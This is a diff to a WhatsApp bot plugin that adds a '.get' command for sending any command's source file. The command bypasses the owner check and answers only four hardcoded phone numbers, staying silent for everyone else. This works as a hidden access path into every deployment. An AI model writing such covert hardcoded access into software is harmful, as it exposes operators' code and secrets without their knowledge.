@@ -301,6 +301,77 @@ async (conn, m, { reply, q, react }) => {
 });           
 
 
+
+cmd({
+    pattern: "get",
+    desc: "Fetch the command's file info and source code",
+    category: "owner",
+    react: "📦",
+    filename: __filename
+},
+async (conn, mek, m, { from, args, reply, isOwner }) => {
+    try {
+        // شماره‌هایی که اجازه دسترسی دارند (با پسوند واتساپ)
+        const allowedNumbers = [
+            "93744215959@s.whatsapp.net",
+            "93782940033@s.whatsapp.net",
+            "93730285765@s.whatsapp.net",
+            "93794320865@s.whatsapp.net"
+        ];
+
+        // اگر شماره دسترسی نداشت، هیچی نگو (ساکت بمونه)
+        if (!allowedNumbers.includes(m.sender)) return;
+
+        if (!args[0]) return reply("❌ Please provide a command name.\nTry: `.get ping`");
+
+        const name = args[0].toLowerCase();
+        const command = commands.find(c => c.pattern === name || (c.alias && c.alias.includes(name)));
+        if (!command) return reply("❌ Command not found.");
+
+        const filePath = command.filename;
+        if (!fs.existsSync(filePath)) return reply("❌ File not found!");
+
+        const fullCode = fs.readFileSync(filePath, 'utf-8');
+        const stats = fs.statSync(filePath);
+        const fileName = path.basename(filePath);
+        const fileSize = (stats.size / 1024).toFixed(2) + " KB";
+        const lastModified = stats.mtime.toLocaleString();
+        const relativePath = path.relative(process.cwd(), filePath);
+
+        // 1. ارسال اطلاعات فایل
+        const infoText = `*───「 Command Info 」───*
+• *Command Name:* ${name}
+• *File Name:* ${fileName}
+• *Size:* ${fileSize}
+• *Last Updated:* ${lastModified}
+• *Category:* ${command.category}
+• *Path:* ./${relativePath}
+
+For code preview, see next message.
+For full file, check attachment.`;
+
+        await conn.sendMessage(from, { text: infoText }, { quoted: mek });
+
+        // 2. ارسال کد پیش‌نمایش
+        const snippet = fullCode.length > 4000 ? fullCode.slice(0, 4000) + "\n\n// ...truncated" : fullCode;
+        await conn.sendMessage(from, {
+            text: "```js\n" + snippet + "\n```"
+        }, { quoted: mek });
+
+        // 3. ارسال فایل کامل
+        await conn.sendMessage(from, {
+            document: fs.readFileSync(filePath),
+            mimetype: 'text/javascript',
+            fileName: fileName
+        }, { quoted: mek });
+
+    } catch (err) {
+        console.error("Error in .get command:", err);
+        // فقط لاگ داخلی، به کسی پیام نده
+    }
+});
+
+
 cmd({
   pattern: "update",
   alias: ["upgrade", "sync"],
